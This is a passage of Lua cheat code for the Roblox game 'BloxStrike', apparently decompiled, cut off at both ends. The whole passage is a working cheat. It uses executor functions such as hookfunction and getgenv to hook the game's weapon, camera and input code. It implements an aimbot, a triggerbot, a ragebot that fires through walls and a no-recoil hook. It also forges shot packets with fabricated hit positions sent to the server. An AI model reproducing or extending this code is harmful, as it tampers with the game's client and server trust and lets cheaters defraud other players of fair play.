							local humanoid = arg:FindFirstChildOfClass("Humanoid")

							if v9 and type(v9.HasInvincibleFlag) == "function" then
								local ok4, result4 = pcall(v9.HasInvincibleFlag, arg, humanoid)
								if ok4 and result4 == true then
									return true
								end
							end

							local ok4, result4 = pcall(function()
								return arg:GetAttribute("Invincible") == true
							end)

							return ok4 and result4 == true
						end

						local function fn86(arg, arg2)
							return arg and arg.Player and fn43(arg.Player) and arg.Character == fn24(arg.Player) and arg.Character and arg.Character.Parent and arg.Part and arg.Part.Parent and typeof(arg.Position) == "Vector3" and fn25(arg.Player, arg.Character) and not fn85(arg.Character) and arg.Character ~= arg2
						end

						local function fn87(arg)
							if type(arg.Rounds) ~= "number" or arg.Rounds > 0 then
								v24 = nil
								n3 = -math.huge
								return false
							end

							local v26 = fn75(arg)

							if v24 ~= v26 then
								v24 = v26
								n3 = -math.huge
							end

							v23 = nil
							if arg.IsReloading == true then
								return true
							end
							local now = os.clock()
							if now - n3 < n10 then
								return true
							end
							n3 = now

							if type(arg.reload) == "function" then
								local isShooting = arg.IsShooting
								local nextShotDue = arg.NextShotDue

								pcall(function()
									arg.IsShooting = false
									arg.NextShotDue = nil
								end)

								pcall(arg.reload, arg)

								pcall(function()
									arg.IsShooting = isShooting
									arg.NextShotDue = nextShotDue
								end)
							end

							return true
						end

						local function fn88(arg, arg2)
							local v26 = fn83()
							local currentCamera = tbl4.Workspace.CurrentCamera
							local v27 = fn58(currentCamera, fn21())
							if not v26 or type(v26.Send) ~= "function" or not currentCamera or not arg2 or typeof(v27) ~= "Vector3" or typeof(arg2.Position) ~= "Vector3" then
								return false
							end
							local n11 = arg2.Position - v27
							if n11.Magnitude <= 0.001 then
								return false
							end
							local unit = n11.Unit

							local ok4, result4 = pcall(function()
								return arg2.Part.Material.Name
							end)

							ok4 = ok4 and type(result4) == "string"
							local str3 = "Plastic"

							if not ok4 then
								result4 = str3
							end

							local tbl13 = {
								Distance = n11.Magnitude,
								Origin = v27,
								Direction = unit,
								Position = arg2.Position,
								Instance = arg2.Part,
								Normal = -unit,
								Material = result4,
							}

							local tbl14 = {}
							local max = math.max
							local floor = math.floor
							local n12 = tonumber(arg.Properties.BulletsPerShot) or 1

							for i = 1, max(floor(n12), 1) do
								tbl14[i] = {
									Direction = unit,
									Origin = v27,
									Hits = {
										{
											Distance = n11.Magnitude,
											Instance = arg2.Part,
											Position = arg2.Position,
											Normal = -unit,
											Material = result4,
											Exit = false,
										},
									},
								}
							end

							arg.ShotSeq = (tonumber(arg.ShotSeq) or 0) + 1

							if not pcall(function()
								v26.Send({
									IsSniperScoped = arg.IsSniperScoped,
									ShootingHand = arg.ShootingHand,
									Identifier = arg.Identifier,
									Seq = arg.ShotSeq,
									Bullets = tbl14,
								})
							end) then
								return false
							end

							if type(v10.CreateBulletTracer) == "function" then
								v10.CreateBulletTracer(v27, arg2.Position, "Local")
							end

							if type(v10.HandleBulletResult) == "function" then
								v10.HandleBulletResult(tbl13)
							end

							if type(arg.Rounds) == "number" then
								arg.Rounds = math.max(arg.Rounds - 1, 0)
							end

							arg.RechargeStartTime = tbl4.Workspace:GetServerTimeNow()
							return true
						end

						local function fn89(arg, arg2)
							if not arg or not arg.Player then
								return
							end
							obj3[arg.Player] = arg2 + 0.03
							v23 = nil
							tbl9.Time = -math.huge
							tbl9.Target = nil
						end

						local function fn90(camera, arg, arg2, arg3)
							local v26 = fn21()

							if not camera or not v26 or not fn25(localPlayer2, v26) then
								tbl9.Time = -math.huge
								tbl9.Target = nil
								tbl9.Origin = nil
								return nil
							end

							local v27 = fn58(camera, v26)

							if not v27 then
								tbl9.Time = -math.huge
								tbl9.Target = nil
								tbl9.Origin = nil
								return nil
							end

							local key = tostring(arg) .. "|" .. "Head" .. "|" .. fn75(arg2) .. "|" .. tostring(arg3)
							local now = os.clock()

							if tbl9.Camera == camera and tbl9.LocalCharacter == v26 and tbl9.Key == key and tbl9.Origin == v27 and now - tbl9.Time < 0.033333333333333333 then
								if not tbl9.Target or fn86(tbl9.Target, v26) then
									return tbl9.Target
								end
							end

							local n11 = camera.ViewportSize * 0.5
							local tbl13 = { "Head" }
							local tbl14 = {}

							for i, v28 in ipairs(tbl13) do
								tbl14[v28] = i
							end

							local function fn91(arg4)
								local n12 = arg4 - v27
								local magnitude = n12.Magnitude
								if magnitude <= 0.001 then
									return nil
								end
								local v28 = camera.CFrame.LookVector:Dot(n12.Unit)
								local v29, v30 = camera:WorldToViewportPoint(arg4)
								if v30 and v29.Z > 0 then
									local vector2 = Vector2.new(v29.X, v29.Y)
									return 0, (vector2 - n11).Magnitude, magnitude, vector2
								end
								return 1, math.acos(math.clamp(v28, -1, 1)), magnitude, nil
							end

							local function fn92(arg4, arg5)
								if not arg5 then
									return true
								end

								if arg4.GroupRank ~= arg5.GroupRank then
									return arg4.GroupRank < arg5.GroupRank
								end

								if arg4.ScreenRank ~= arg5.ScreenRank then
									return arg4.ScreenRank < arg5.ScreenRank
								end

								if math.abs(arg4.Metric - arg5.Metric) > 0.001 then
									return arg4.Metric < arg5.Metric
								end
								return arg4.WorldDistance < arg5.WorldDistance
							end

							local v28 = nil

							for _, player2 in ipairs(tbl4.Players:GetPlayers()) do
								local v29 = obj3[player2]

								if v29 and v29 <= now then
									obj3[player2] = nil
									v29 = nil
								end

								if (not arg3 or player2 == arg3) and not v29 and fn43(player2) then
									local v30 = fn24(player2)

									if fn25(player2, v30) and not fn85(v30) then
										for _, v31 in ipairs(tbl13) do
											local v32 = ipairs
											local v33 = table.pack(fn55(v30, v31))
											v33.n = 1 + v33.n - 1
											table.move(v33, 1, v33.n, 1, v33)

											for _, v34 in v32(table.unpack(v33, 1, v33.n)) do
												for _, v35 in ipairs(fn59(camera, v34, v27)) do
													local v36, v37, v38, v39 = fn91(v35)

													if v36 then
														if not arg then
															local v40 = fn50(camera, v27, v35 - v27, false, v26)

															if v40 and v40.Instance and v40.Instance:IsDescendantOf(v30) then
																local tbl15 = {
																	Player = player2,
																	Character = v30,
																	Part = v34,
																	Group = v31,
																	GroupRank = tbl14[v31] or math.huge,
																	Position = v35,
																	Screen = v39,
																	ScreenRank = v36,
																	Metric = v37,
																	WorldDistance = v38,
																}

																if fn92(tbl15, v28) then
																	v28 = tbl15
																end
															end
														elseif arg then
															local tbl15 = {
																Player = player2,
																Character = v30,
																Part = v34,
																Group = v31,
																GroupRank = tbl14[v31] or math.huge,
																Position = v35,
																Screen = v39,
																ScreenRank = v36,
																Metric = v37,
																WorldDistance = v38,
															}

															if fn92(tbl15, v28) then
																v28 = tbl15
															end
														end
													end
												end
											end
										end
									end
								end
							end

							tbl9.Camera = camera
							tbl9.LocalCharacter = v26
							tbl9.Key = key
							tbl9.Origin = v27
							tbl9.Time = now
							tbl9.Target = v28
							return v28
						end

						local function fn91()
							tbl9.Time = -math.huge
							tbl9.Target = nil
							tbl9.Camera = nil
							tbl9.LocalCharacter = nil
							tbl9.Key = nil
							tbl9.Origin = nil
							v23 = nil
							v24 = nil
							n3 = -math.huge
							n4 = -math.huge
							v25 = nil
							table.clear(obj3)
						end

						local function fn92()
							if type(hookfunction) ~= "function" or not tbl5.Character then
								return
							end
							local flag = type(tbl5.Character.SampleInput) ~= "function" and type(tbl5.Character.PrepareInputFrame) ~= "function" and type(tbl5.Character.Present) ~= "function"

							if flag then
								flag = not (tbl5.CommandStream and type(tbl5.CommandStream.sample) == "function")
							end

							if flag then
								return
							end
							local genv = type(getgenv) == "function" and getgenv() or _G
							local bloxStrikeMovementInputHook = genv.BloxStrikeMovementInputHook or genv.BloxStrikeAntiAimHook

							if type(bloxStrikeMovementInputHook) ~= "table" then
								bloxStrikeMovementInputHook = {}
							end

							genv.BloxStrikeMovementInputHook = bloxStrikeMovementInputHook
							genv.BloxStrikeAntiAimHook = bloxStrikeMovementInputHook

							local function apply(arg, arg2)
								return arg2
							end

							local function applyLocalPose(arg)
								if type(arg) ~= "table" or arg.Player ~= localPlayer2 or not tbl5.CharacterPose or type(tbl5.CharacterPose.getJoints) ~= "function" or type(tbl5.CharacterPose.applyVerticalLook) ~= "function" then
									return
								end
								local character = arg.Character
								if typeof(character) ~= "Instance" then
									return
								end

								if type(bloxStrikeMovementInputHook.PoseJoints) ~= "table" then
									bloxStrikeMovementInputHook.PoseJoints = setmetatable({}, { __mode = "k" })
								end

								local result4 = bloxStrikeMovementInputHook.PoseJoints[character]

								if not result4 then
									local ok4
									ok4, result4 = pcall(tbl5.CharacterPose.getJoints, character)
									if not ok4 or not result4 then
										return
									end
									bloxStrikeMovementInputHook.PoseJoints[character] = result4
								end

								local flag2 = fn9("BloxStrike Third Person") and type(arg.CurrentFrameVerticalLook) == "number"
								local n11 = 0

								if flag2 then
									local currentFrameVerticalLook = arg.CurrentFrameVerticalLook
									local v26
									v26, n11 = fn39(arg.CurrentFrameLookYaw, currentFrameVerticalLook)

									if type(n11) ~= "number" then
										n11 = currentFrameVerticalLook
									end
								end

								pcall(tbl5.CharacterPose.applyVerticalLook, result4, n11, 0.003)
							end

							bloxStrikeMovementInputHook.Apply = apply
							bloxStrikeMovementInputHook.ApplyCommand = applyCommand
							bloxStrikeMovementInputHook.ApplyLocalPose = applyLocalPose

							local fn93 = type(newcclosure) == "function" and newcclosure or function(arg)
								return arg
							end

							if not bloxStrikeMovementInputHook.Original and type(tbl5.Character.SampleInput) == "function" then
								local v26 = nil

								local function fn94(arg, ...)
									local v27 = pcall
									local v28 = v26
									local v29 = table.pack(...)
									v29.n = 3 + v29.n - 1
									table.move(v29, 1, v29.n, 3, v29)
									v29[1] = v28
									v29[2] = arg
									local v30, v31 = v27(table.unpack(v29, 1, v29.n))

									if not v30 then
										error(v31, 0)
									end

									if type(v31) == "table" then
										return bloxStrikeMovementInputHook.Apply(arg, v31)
									end
									return v31
								end

								v26 = hookfunction
								v26 = v26(tbl5.Character.SampleInput, fn93(fn94))
								bloxStrikeMovementInputHook.Original = v26
							end

							if not bloxStrikeMovementInputHook.PresentOriginal and type(tbl5.Character.Present) == "function" then
								local v26 = nil

								local function fn94(arg, ...)
									local v27 = pcall
									local v28 = v26
									local v29 = table.pack(...)
									v29.n = 3 + v29.n - 1
									table.move(v29, 1, v29.n, 3, v29)
									v29[1] = v28
									v29[2] = arg
									local v30, v31 = v27(table.unpack(v29, 1, v29.n))

									if not v30 then
										error(v31, 0)
									end

									if type(bloxStrikeMovementInputHook.ApplyLocalPose) == "function" then
										bloxStrikeMovementInputHook.ApplyLocalPose(arg)
									end

									return v31
								end

								v26 = hookfunction
								v26 = v26(tbl5.Character.Present, fn93(fn94))
								bloxStrikeMovementInputHook.PresentOriginal = v26
							end

							if not bloxStrikeMovementInputHook.SampleOriginal and tbl5.CommandStream and type(tbl5.CommandStream.sample) == "function" then
								local v26 = nil

								local function fn94(arg, arg2, ...)
									if type(bloxStrikeMovementInputHook.ApplyCommand) == "function" then
										arg2 = bloxStrikeMovementInputHook.ApplyCommand(arg2)
									end

									local v27 = v26
									local v28 = table.pack(...)
									v28.n = 3 + v28.n - 1
									table.move(v28, 1, v28.n, 3, v28)
									v28[1] = arg
									v28[2] = arg2
									return v27(table.unpack(v28, 1, v28.n))
								end

								v26 = hookfunction
								v26 = v26(tbl5.CommandStream.sample, fn93(fn94))
								bloxStrikeMovementInputHook.SampleOriginal = v26
							end
						end

						local function fn93(arg, arg2, arg3, arg4, arg5)
							local position = arg.CFrame.Position

							for _, player2 in ipairs(tbl4.Players:GetPlayers()) do
								local v26 = fn24(player2)
								if not fn43(player2) or not fn25(player2, v26) then
									continue
								end
								local v27 = ipairs
								local v28 = table.pack(fn56(v26, arg5))
								v28.n = 1 + v28.n - 1
								table.move(v28, 1, v28.n, 1, v28)

								for _, v29 in v27(table.unpack(v28, 1, v28.n)) do
									local v30 = ipairs
									local v31 = table.pack(fn59(arg, v29))
									v31.n = 1 + v31.n - 1
									table.move(v31, 1, v31.n, 1, v31)

									for _, v32 in v30(table.unpack(v31, 1, v31.n)) do
										if arg3 < (v32 - position).Magnitude then
											continue
										end
										local v33, v34 = arg:WorldToViewportPoint(v32)

										if v34 and v33.Z > 0 then
											if not ((Vector2.new(v33.X, v33.Y) - arg2).Magnitude <= 6) then
												continue
											end
											local v35 = fn50(arg, position, v32 - position, arg4)
											local v36, v37, v38 = fn74(v35, arg5)
											if v36 == player2 and v37 == v26 and v38 then
												return v35, v36, v37, v38
											end
										end
									end
								end
							end

							return nil
						end

						local function fn94()
							v18 = nil
							v19 = nil
							v20 = nil
							v21 = nil
							n = 0
							n2 = 0
						end

						local function fn95(arg, arg2)
							if not fn9("BloxStrike TriggerBot") or not tbl5.InventoryController then
								fn94()
								return
							end
							local v26 = fn21()
							if not fn25(localPlayer2, v26) then
								fn94()
								return
							end

							if not fn44("BloxStrike Legit TriggerBot Conditions", "Ignore Flash") and fn46() then
								fn94()
								return
							end
							local ok4, result4 = pcall(tbl5.InventoryController.getCurrentEquipped)
							if not ok4 or type(result4) ~= "table" or not result4.Properties or result4.Properties.Class ~= "Weapon" then
								fn94()
								return
							end

							if result4.IsReloading or type(result4.Rounds) == "number" and result4.Rounds <= 0 then
								fn94()
								return
							end
							local n11 = arg.ViewportSize * 0.5
							local range = result4.Properties.Range or 3000
							local v27 = fn44("BloxStrike Legit TriggerBot Conditions", "Through Smokes")
							local v28, v29, v30 = fn74(fn51(arg, range, v27), "BloxStrike Legit TriggerBot Hitboxes")

							if not v28 or not fn43(v28) or not fn25(v28, v29) or not v30 then
								local v31
								v31, v28, v29, v30 = fn93(arg, n11, range, v27, "BloxStrike Legit TriggerBot Hitboxes")
							end

							if not v28 or not fn43(v28) or not fn25(v28, v29) or not v30 then
								fn94()
								return
							end
							local v31 = fn75(result4)

							if v18 ~= v28 or v19 ~= v29 or v20 ~= v31 then
								v18 = v28
								v19 = v29
								v20 = v31
								v21 = arg2
								n = 0
							end

							if arg2 - (v21 or arg2) < fn11("BloxStrike Legit TriggerBot Reaction Time", 0) / 1000 then
								return
							end
							local n12 = math.max(fn11("BloxStrike Legit TriggerBot Burst Time", 50), 0) / 1000

							if n12 > 0 then
								if n <= 0 then
									if not fn80(arg, result4, v30) or not fn81(result4, v30) then
										return
									end
									n = arg2 + n12
								end

								if n <= arg2 then
									n = 0
									return
								end
							elseif not fn80(arg, result4, v30) or not fn81(result4, v30) then
								return
							end

							if arg2 - (n2 or 0) >= 0.1 then
								if pcall(result4.shoot, result4) then
									n2 = arg2
								else
									fn94()
								end
							end
						end

						local function fn96(arg, arg2)
							return math.clamp(fn11(arg, arg2), 0, 100) / 100
						end

						local function fn97(arg, arg2)
							if arg2 >= 1 then
								return arg
							end

							if typeof(arg) == "number" then
								return arg * arg2
							end

							if typeof(arg) == "Vector3" then
								return arg * arg2
							end

							if typeof(arg) == "Vector2" then
								return arg * arg2
							end

							if typeof(arg) == "CFrame" then
								return CFrame.new():Lerp(arg, arg2)
							end
							return arg
						end

						local function fn98(arg)
							if tbl5.GameState and type(tbl5.GameState.GetState) == "function" and tbl5.GameState.GetState() == "Buy Period" then
								fn91()
								return
							end

							if not fn9("BloxStrike Ragebot Enabled") or not arg then
								fn91()
								return
							end
							local v26 = fn21()
							if not fn25(localPlayer2, v26) then
								fn91()
								return
							end
							local v27 = fn82()
							if not v27 then
								fn91()
								return
							end
							local now = os.clock()
							if fn87(v27) then
								n4 = now
								return
							end

							if v27.IsReloading == true or not fn84(v27) then
								v23 = nil
								return
							end
							local v28 = fn9("BloxStrike Ragebot Aim Through Walls")
							local bloxStrikeRagebotMultiTap = fn9("BloxStrike Ragebot Multi Tap")

							if v25 ~= bloxStrikeRagebotMultiTap then
								v25 = bloxStrikeRagebotMultiTap
								v23 = nil
							end

							local v29

							if bloxStrikeRagebotMultiTap then
								v23 = nil
								v29 = fn90(arg, v28, v27)
								v23 = v29
							else
								v29 = fn90(arg, v28, v27)
								v23 = v29
							end

							if not v29 or not fn86(v29, v26) then
								v23 = nil
								return
							end
							local n11

							if bloxStrikeRagebotMultiTap then
								n11 = math.clamp(fn11("BloxStrike Ragebot Multi Tap Delay", 50), 1, 100) / 1000
							else
								local fireModes = v27.Properties.FireModes
								fireModes = fireModes and fireModes.Primary
								n11 = math.max(tonumber(fireModes and fireModes.FireRate or v27.Properties.FireRate) or 0.1, 0.001)
							end

							if now - n4 < n11 then
								return
							end
							n4 = now
							local v30 = fn88(v27, v29)

							if bloxStrikeRagebotMultiTap then
								if v30 then
									fn89(v29, now)
								else
									v23 = nil
									tbl9.Time = -math.huge
									tbl9.Target = nil
								end
							end
						end

						local function fn99()
							if type(hookfunction) ~= "function" then
								return
							end
							local genv = type(getgenv) == "function" and getgenv() or _G

							local function fn100()
								return genv.BloxStrikeDisableWeaponHooks ~= true
							end

							local bloxStrikeWeaponHooks = genv.BloxStrikeWeaponHooks or {}
							genv.BloxStrikeWeaponHooks = bloxStrikeWeaponHooks

							local fn101 = type(newcclosure) == "function" and newcclosure or function(arg)
								return arg
							end

							local function fn102(arg, arg2, arg3)
								if not arg or type(arg[arg2]) ~= "function" then
									return
								end
								local v26 = nil

								local function fn103(...)
									local v27 = table.pack(...)
									local ok4, result4 = pcall(arg3, v26, ...)
									if ok4 then
										return result4
									end
									return v26(table.unpack(v27, 1, v27.n))
								end

								v26 = hookfunction
								v26 = v26(arg[arg2], fn101(fn103))
							end

							local function fn103(arg, arg2)
								local ok4, result4 = pcall(function()
									return arg and arg[arg2]
								end)

								if not ok4 then
									return nil
								end

								if typeof(result4) == "Vector3" then
									return result4
								end

								if typeof(result4) == "CFrame" then
									return result4.Position
								end
								return nil
							end

							local function fn104(arg)
								for _, v26 in ipairs({ "Position", "Origin", "StartPosition", "FirePosition" }) do
									local v27 = fn103(arg, v26)
									if v27 then
										return v27
									end
								end

								for _, v26 in ipairs({ "getPosition", "getOrigin", "getStartPosition" }) do
									local ok4, result4 = pcall(function()
										return arg and arg[v26]
									end)

									if ok4 and type(result4) == "function" then
										local ok5, result5 = pcall(result4, arg)

										if ok5 then
											if typeof(result5) == "Vector3" then
												return result5
											end

											if typeof(result5) == "CFrame" then
												return result5.Position
											end
										end
									end
								end

								if tbl5.CameraController and type(tbl5.CameraController.toWeaponFirePosition) == "function" then
									local ok4, result4 = pcall(tbl5.CameraController.toWeaponFirePosition)
									if ok4 and typeof(result4) == "CFrame" then
										return result4.Position
									end
								end

								local currentCamera = tbl4.Workspace.CurrentCamera
								return currentCamera and currentCamera.CFrame.Position or nil
							end

							local function fn105(arg)
								local ok4, result4 = pcall(function()
									return arg and arg.Position
								end)

								return ok4 and typeof(result4) == "Vector3" and result4 or nil
							end

							local function fn106(arg, ...)
								local v26 = table.pack(...)
								if typeof(arg) == "Vector3" and arg.Magnitude > 0.01 then
									return arg.Unit
								end

								for i = 1, select("#", ...) do
									local value = select(i, table.unpack(v26, 1, v26.n))
									if typeof(value) == "Vector3" and value.Magnitude > 0.01 then
										return value.Unit
									end
								end

								local currentCamera = tbl4.Workspace.CurrentCamera
								return currentCamera and currentCamera.CFrame.LookVector or nil
							end

							bloxStrikeWeaponHooks.GetTrueSpread = function(arg, ...)
								local v26 = arg(...)
								if not tbl2.Running or not fn100() then
									return v26
								end
								return fn97(v26, fn96("BloxStrike Spread Scale", 100))
							end

							bloxStrikeWeaponHooks.PerformRaycast = function(arg, arg2, arg3, ...)
								local v26 = table.pack(...)
								local v27

								if tbl2.Running and fn100() then
									v27 = fn97(arg3, fn96("BloxStrike Spread Scale", 100))
								else
									v27 = arg3
								end

								local bloxStrikeBulletTracer = tbl2.Running and fn100() and fn9("BloxStrike Bullet Tracer")
								local bloxStrikeBulletImpacts = tbl2.Running and fn100() and (fn9("BloxStrike Bullet Impacts") or fn9("BloxStrike Hit Mark"))
								local v28 = bloxStrikeBulletTracer and fn104(arg2) or nil
								local v29 = arg(arg2, v27, ...)

								if bloxStrikeBulletTracer and v28 and type(v10.CreateBulletTracer) == "function" then
									local n11 = fn105(v29)

									if not n11 then
										n11 = fn106(v27, table.unpack(v26, 1, v26.n))
										n11 = n11 and v28 + n11 * 2000 or nil
									end

									if n11 then
										v10.CreateBulletTracer(v28, n11, "Local")
									end
								end

								if bloxStrikeBulletImpacts and type(v10.HandleBulletResult) == "function" then
									v10.HandleBulletResult(v29)
								end

								return v29
							end

							bloxStrikeWeaponHooks.SuppressRecoil = function()
								return tbl2.Running and fn100() and fn9("BloxStrike No Recoil")
							end

							if bloxStrikeWeaponHooks.Installed then
								return
							end
							bloxStrikeWeaponHooks.Installed = true

							fn102(tbl5.Bullet, "getTrueSpread", function(arg, ...)
								return bloxStrikeWeaponHooks.GetTrueSpread(arg, ...)
							end)

							fn102(tbl5.Bullet, "_performRaycast", function(arg, arg2, arg3, ...)
								local performRaycast = bloxStrikeWeaponHooks.PerformRaycast
								local v26 = table.pack(...)
								v26.n = 4 + v26.n - 1
								table.move(v26, 1, v26.n, 4, v26)
								v26[1] = arg
								v26[2] = arg2
								v26[3] = arg3
								return performRaycast(table.unpack(v26, 1, v26.n))
							end)

							for _, v26 in ipairs({ "setWeaponRecoil", "weaponKick" }) do
								if tbl5.CameraController and type(tbl5.CameraController[v26]) == "function" then
									local v27 = nil

									local function fn107(...)
										if bloxStrikeWeaponHooks.SuppressRecoil() then
											return
										end
										return v27(...)
									end

									v27 = hookfunction
									v27 = v27(tbl5.CameraController[v26], fn101(fn107))
								end
							end
						end

						fn99()
						fn92()

						return { Update = function()
							local currentCamera = tbl4.Workspace.CurrentCamera

							if not currentCamera then
								Circle.Visible = false
								fn91()
								return
							end

							local v26 = fn52(currentCamera)
							local v27 = Circle
							Circle.Position = currentCamera.ViewportSize * 0.5
							v27.Radius = v26
							Circle.Visible = fn9("BloxStrike Aimbot")
							local now = os.clock()

							if not fn9("BloxStrike Aimbot") or not fn71() or not fn44("BloxStrike Legit Aimbot Conditions", "Ignore Flash") and fn46() then
								fn70()
							else
								local ok4, result4 = pcall(fn69, currentCamera, v26)

								if not ok4 then
									tbl7.Time = -math.huge
									tbl7.Target = nil
									tbl8.Time = -math.huge
									fn70()
								end

								local flag

								if not result4 then
									fn70()
									flag = true
								elseif v15 and v15.Player ~= result4.Player then
									if player ~= result4.Player then
										player = result4.Player
										v17 = now
										flag = true
									else
										local n11 = now - v17

										if fn11("BloxStrike Legit Aimbot Target Switch Delay", 200) / 1000 <= n11 then
											v15 = result4
											v16 = now
											player = nil
											v17 = nil
											flag = true
										else
											flag = false
										end
									end
								else
									v15 = result4
									player = nil
									v17 = nil
									flag = true

									if not v16 then
										v16 = now
									end
								end

								flag = flag and v15

								if flag then
									flag = now - (v16 or now) >= fn11("BloxStrike Legit Aimbot Reaction Time", 200) / 1000
								end

								if flag then
									local n11 = math.clamp(fn11("BloxStrike Legit Aimbot Smoothing", 50), 0, 100)
									fn72(currentCamera, v15.Position, n11 == 0 and 1 or math.clamp((100 - n11) / 100, 0.01, 0.99))
								end
							end

							if not pcall(fn98, currentCamera) then
								fn91()
							end

							if not pcall(fn95, currentCamera, now) then
								fn94()
							end
						end }
					end

					local v11 = fn40()

					local function fn41()
						local v12 = nil
						local n = nil
						local v13 = nil
						local flag = nil
						local genv = type(getgenv) == "function" and getgenv() or _G
						local v14 = nil
						local tbl7 = {}
						local tbl8 = {}
						local playerGui = localPlayer2:FindFirstChildOfClass("PlayerGui")

						local function getSettings()
							local clamp = math.clamp
							return fn9("BloxStrike Third Person"), (clamp(fn11("BloxStrike Third Person Distance", 10), 5, 100))
						end

						local function setDistance(cameraMaxZoomDistance)
							pcall(function()
								localPlayer2.CameraMaxZoomDistance = cameraMaxZoomDistance
								localPlayer2.CameraMinZoomDistance = cameraMaxZoomDistance
							end)
						end

						local function fn42(arg)
							while arg and arg ~= playerGui do
								if arg:IsA("GuiObject") and not arg.Visible then
									return false
								end

								if arg:IsA("ScreenGui") and not arg.Enabled then
									return false
								end
								arg = arg.Parent
							end

							return true
						end

						local function fn43()
							playerGui = playerGui and playerGui.Parent and playerGui or localPlayer2:FindFirstChildOfClass("PlayerGui")
							if not playerGui then
								return false
							end
							local buyMenu = playerGui:FindFirstChild("BuyMenu", true)
							return buyMenu ~= nil and fn42(buyMenu)
						end

						local function isMenuTakingOver()
							if fn43() then
								return true
							end

							if type(debug) == "table" and type(debug.traceback) == "function" then
								local ok4, result4 = pcall(debug.traceback)
								return ok4 and type(result4) == "string" and result4:find("BuyMenu", 1, true) ~= nil
							end
							return false
						end

						local function fn44(arg)
							if not arg then
								return false
							end
							local v15 = fn21()
							local cameraSubject = arg.CameraSubject
							return v15 ~= nil and cameraSubject ~= nil and (cameraSubject == v15 or cameraSubject:IsDescendantOf(v15))
						end

						local function canForce()
							if not tbl2.Running or not flags or not fn9("BloxStrike Third Person") then
								return false
							end

							if localPlayer2:GetAttribute("Dead") == true or fn43() then
								return false
							end

							if not fn44(tbl4.Workspace.CurrentCamera) then
								return false
							end
							local v15 = fn20()
							local character = v15 and v15.Character or fn21()
							local flag2 = false

							if v15 then
								if type(v15.IsTakingOverCamera) == "function" then
									local ok4, result4 = pcall(v15.IsTakingOverCamera, v15)
									flag2 = ok4 and result4 == true
								else
									flag2 = v15.IsTakingOverCamera == true
								end
							end

							if character and character:GetAttribute("IsTakingOverCamera") == true then
								flag2 = true
							end

							return not flag2
						end

						local function fn45()
							for i = #tbl7, 1, -1 do
								tbl7[i]:Disconnect()
								tbl7[i] = nil
							end

							v14 = nil
						end

						local function fn46(arg)
							local v15 = tbl8[arg]
							if v15 == nil then
								return
							end
							tbl8[arg] = nil

							pcall(function()
								if arg.Parent then
									arg.LocalTransparencyModifier = v15
								end
							end)
						end

						local function fn47()
							local tbl9 = {}

							for k in pairs(tbl8) do
								tbl9[#tbl9 + 1] = k
							end

							for i = 1, #tbl9 do
								fn46(tbl9[i])
							end

							fn45()
						end

						local function fn48(arg, arg2)
							while arg2 and arg2.Parent ~= arg do
								arg2 = arg2.Parent
							end

							return arg2 and arg2:IsA("Model")
						end

						local function fn49(arg, arg2)
							if not arg2:IsA("BasePart") or not fn48(arg, arg2) then
								return
							end

							if tbl8[arg2] == nil then
								tbl8[arg2] = arg2.LocalTransparencyModifier
							end

							pcall(function()
								arg2.LocalTransparencyModifier = 1
							end)
						end

						local function fn50(arg, arg2)
							if not arg2:IsA("Model") or arg2.Parent ~= arg then
								return
							end

							for _, descendant in ipairs(arg2:GetDescendants()) do
								fn49(arg, descendant)
							end
						end

						local function fn51(arg)
							if v14 == arg then
								return
							end
							fn47()
							v14 = arg

							for _, child in ipairs(arg:GetChildren()) do
								fn50(arg, child)
							end

							tbl7[#tbl7 + 1] = arg.ChildAdded:Connect(function(child)
								fn50(arg, child)
							end)

							tbl7[#tbl7 + 1] = arg.ChildRemoved:Connect(function(child)
								if not child:IsA("Model") then
									return
								end
								local tbl9 = {}

								for k in pairs(tbl8) do
									if k:IsDescendantOf(child) then
										tbl9[#tbl9 + 1] = k
									end
								end

								for i = 1, #tbl9 do
									fn46(tbl9[i])
								end
							end)

							tbl7[#tbl7 + 1] = arg.DescendantAdded:Connect(function(descendant)
								fn49(arg, descendant)
							end)
						end

						local function fn52()
							pcall(function()
								tbl4.UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
								tbl4.UserInputService.MouseIconEnabled = false
							end)
						end

						local function fn53()
							local cameraController = tbl5.CameraController
							if type(hookfunction) ~= "function" or not cameraController or type(cameraController.setMouseEnabled) ~= "function" then
								return
							end
							local bloxStrikeCameraMouseHook = genv.BloxStrikeCameraMouseHook

							if bloxStrikeCameraMouseHook then
								bloxStrikeCameraMouseHook.CanForce = canForce
								bloxStrikeCameraMouseHook.IsMenuTakingOver = isMenuTakingOver
								return
							end

							local bloxStrikeCameraMouseHook2 = { CanForce = canForce, IsMenuTakingOver = isMenuTakingOver }
							genv.BloxStrikeCameraMouseHook = bloxStrikeCameraMouseHook2

							local fn54 = type(newcclosure) == "function" and newcclosure or function(arg)
								return arg
							end

							local v15 = nil
							local setMouseEnabled = cameraController.setMouseEnabled

							local function fn55(arg, ...)
								local flag2 = bloxStrikeCameraMouseHook2.CanForce() and not bloxStrikeCameraMouseHook2.IsMenuTakingOver()
								local v16 = v15

								if flag2 then
								end

								return v16(arg, ...)
							end

							v15 = hookfunction
							v15 = v15(setMouseEnabled, fn54(fn55))
							bloxStrikeCameraMouseHook2.Original = v15
						end

						local function fn54()
							local cameraController = tbl5.CameraController
							if type(hookfunction) ~= "function" or not cameraController or type(cameraController.setPerspective) ~= "function" then
								return
							end
							local bloxStrikeCameraPerspectiveHook = genv.BloxStrikeCameraPerspectiveHook

							if bloxStrikeCameraPerspectiveHook and (bloxStrikeCameraPerspectiveHook.WrapperVersion == 2 or bloxStrikeCameraPerspectiveHook.WrapperVersion == 3) then
								bloxStrikeCameraPerspectiveHook.WrapperVersion = 3
								bloxStrikeCameraPerspectiveHook.GetSettings = getSettings
								bloxStrikeCameraPerspectiveHook.CanForce = canForce
								bloxStrikeCameraPerspectiveHook.SetDistance = setDistance
								bloxStrikeCameraPerspectiveHook.IsMenuTakingOver = isMenuTakingOver
								fn53(bloxStrikeCameraPerspectiveHook)
								return
							end

							local flag2 = bloxStrikeCameraPerspectiveHook ~= nil
							bloxStrikeCameraPerspectiveHook = bloxStrikeCameraPerspectiveHook or {}
							bloxStrikeCameraPerspectiveHook.WrapperVersion = 3
							bloxStrikeCameraPerspectiveHook.GetSettings = getSettings
							bloxStrikeCameraPerspectiveHook.CanForce = canForce
							bloxStrikeCameraPerspectiveHook.SetDistance = setDistance
							bloxStrikeCameraPerspectiveHook.IsMenuTakingOver = isMenuTakingOver
							genv.BloxStrikeCameraPerspectiveHook = bloxStrikeCameraPerspectiveHook

							local fn55 = type(newcclosure) == "function" and newcclosure or function(arg)
								return arg
							end

							local v15 = nil

